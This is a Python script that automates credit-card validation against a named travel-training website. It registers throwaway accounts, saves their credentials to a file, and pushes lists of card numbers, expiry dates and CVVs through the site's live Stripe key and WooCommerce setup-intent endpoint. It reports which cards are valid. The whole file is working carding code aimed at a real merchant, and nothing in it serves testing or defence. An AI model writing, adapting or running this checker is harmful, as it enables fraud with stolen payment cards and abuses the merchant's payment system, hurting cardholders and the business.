import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
import requests
import requests
import re
import time
from bs4 import BeautifulSoup
from random import randint, choice

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    name = ''.join([chr(randint(97, 122)) for _ in range(8)])
    return f"{name}@{choice(domains)}"

def print_sline():
    print("-" * 50)

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        # Initial GET request to get nonces
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        if response.status_code != 200:
            return None

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})
        
        if not nonce or not noncee:
            return None

        nonce = nonce['value']
        noncee = noncee['value']

        # Registration POST request
        data = [
            ('afurd_field_nonce', nonce),
            ('_wp_http_referer', '/register/'),
            ('email', email),
            ('password', 'Esahatam2009@'),
            ('woocommerce-register-nonce', noncee),
            ('register', 'Register'),
        ]

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
        })

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f"{email}:Esahatam2009@\n")
            return session
        return None

    except Exception as e:
        print(f"Session creation error: {str(e)}")
        return None

def check_credit_cards(cc_list, session):
    start_time = time.time()
    total = len(cc_list)
    hit = 0
    dec = 0
    ccn = 0

    for cc in cc_list:
        try:
            print_sline()
            card = cc.replace('/', '|').split("|")
            if len(card) < 4:
                continue

            cc_num, mm, yy, cvv = card[:4]
            yy = yy.split("20")[-1] if "20" in yy else yy

            # Get setup page
            response = session.get(
                'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                timeout=20
            )
            if response.status_code != 200:
                continue

            nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
            if not nonce_match:
                continue
            nonce = nonce_match.group(1)

            # Create Stripe payment method
            stripe_data = {
                'type': 'card',
                'card[number]': cc_num,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'billing_details[address][postal_code]': '10080',
                'billing_details[address][country]': 'US',
                'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            }

            stripe_response = session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=stripe_data,
                timeout=20
            )
            
            if stripe_response.status_code != 200:
                continue

            payment_method_id = stripe_response.json().get('id')
            if not payment_method_id:
                continue

            # Confirm setup intent
            setup_intent_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            response = session.post(
                'https://www.thetravelinstitute.com/',
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                data=setup_intent_data,
                timeout=20
            )

            if response.status_code == 200:
                result = response.json()
                if result.get('result') == 'success':
                    hit += 1
                    print(f"Valid Card: {cc_num}|{mm}|{yy}|{cvv}")
                else:
                    dec += 1
            ccn += 1

        except Exception as e:
            print(f"Card processing error: {str(e)}")
            continue

    print_sline()
    print(f"Total: {total} | Hit: {hit} | Declined: {dec} | Checked: {ccn}")
    print(f"Time Elapsed: {time.time() - start_time:.2f} seconds")

# Example usage:
if __name__ == "__main__":
    session = create_session()
    if session:
        cc_list = ["4242424242424242|12|2026|123"]  # Add your test cards here
        check_credit_cards(cc_list, session)
    else:
        print("Failed to create session")
